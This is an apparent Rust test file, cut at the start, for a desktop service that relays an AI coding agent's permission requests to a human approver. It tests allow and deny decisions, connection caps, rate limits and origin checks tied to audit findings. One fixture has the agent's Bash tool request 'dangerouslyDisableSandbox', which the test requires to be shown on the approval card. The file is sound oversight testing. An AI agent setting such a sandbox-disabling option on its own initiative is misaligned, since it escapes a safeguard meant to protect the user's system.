        .header("authorization", format!("Bearer {UI}"))
        .send()
        .await
        .unwrap();
    assert_eq!(res.status().as_u16(), 200);
    send(&mut ws, decide(&id, "allow", "user")).await;
    assert_eq!(
        next_of(&mut ws, &["approval_resolved"]).await["decision"],
        "allow"
    );
    let res = tokio::time::timeout(WAIT, h).await.unwrap().unwrap();
    assert_eq!(
        res.pointer("/hookSpecificOutput/decision/behavior"),
        Some(&json!("allow"))
    );

    // Deny không cần mở bản đầy đủ.
    let h = t.permission(json!({
        "hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "D:/code",
        "tool_name": "Write", "tool_input": { "file_path": "/a", "content": "c".repeat(3000) },
    }));
    let id = requested_id(&mut ws).await;
    send(&mut ws, decide(&id, "deny", "user")).await;
    let res = tokio::time::timeout(WAIT, h).await.unwrap().unwrap();
    assert_eq!(
        res.pointer("/hookSpecificOutput/decision/behavior"),
        Some(&json!("deny"))
    );
    t.stop().await;
}

#[tokio::test]
async fn bash_options_reach_the_card() {
    // Finding 2: `dangerouslyDisableSandbox` phải hiện trên thẻ, tách khỏi lệnh.
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    let _h = t.permission(json!({
        "hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "D:/code",
        "tool_name": "Bash",
        "tool_input": { "command": "ls", "description": "d", "dangerouslyDisableSandbox": true },
    }));
    let card = next_of(&mut ws, &["approval_requested"]).await;
    assert_eq!(card["approval"]["command_normalized"], "ls");
    assert_eq!(
        card["approval"]["tool_options"],
        json!({ "dangerouslyDisableSandbox": "true" })
    );
    t.stop().await;
}

#[tokio::test]
async fn ws_connections_are_capped() {
    let t = T::start().await;
    let mut open = Vec::new();
    for _ in 0..ws::MAX_CLIENTS {
        open.push(t.connect().await.0);
    }
    assert_eq!(t.ws.clients(), ws::MAX_CLIENTS);
    let err = t
        .connect_with(Some(UI), None, Some("http://tauri.localhost"), None)
        .await
        .unwrap_err();
    assert_eq!(status_of(err), 503);
    // Đóng một kết nối thì lại nhận được.
    let mut first = open.remove(0);
    first.close(None).await.unwrap();
    tokio::time::timeout(WAIT, async {
        while t.ws.clients() >= ws::MAX_CLIENTS {
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
    })
    .await
    .unwrap();
    t.connect().await;
    t.stop().await;
}

#[tokio::test]
async fn team_commands_share_rate_limit() {
    let t = T::start().await;
    let (mut ws, _) = t.connect().await;
    for i in 0..25 {
        send(&mut ws, json!({ "t": "focus_set", "on": i % 2 == 0 })).await;
    }
    let mut limited = 0;
    let mut updates = 0;
    while updates + limited < 25 {
        let v = next_of(&mut ws, &["feed", "team_updated"]).await;
        if v["t"] == "feed" {
            assert_eq!(v["text"], "Quá nhiều lệnh, hãy thử lại sau");
            limited += 1;
        } else {
            updates += 1;
        }
    }
    assert_eq!((updates, limited), (20, 5));
    t.stop().await;
}

#[tokio::test]
async fn vite_dev_origin_only_in_debug_builds() {
    // Finding 8: cổng Vite mặc định không được tin ở bản release.
    let t = T::start().await;
    let r = t
        .connect_with(Some(UI), None, Some("http://localhost:5173"), None)
        .await;
    if cfg!(debug_assertions) {
        assert!(r.is_ok());
    } else {
        assert_eq!(status_of(r.unwrap_err()), 403);
    }
    t.stop().await;
}
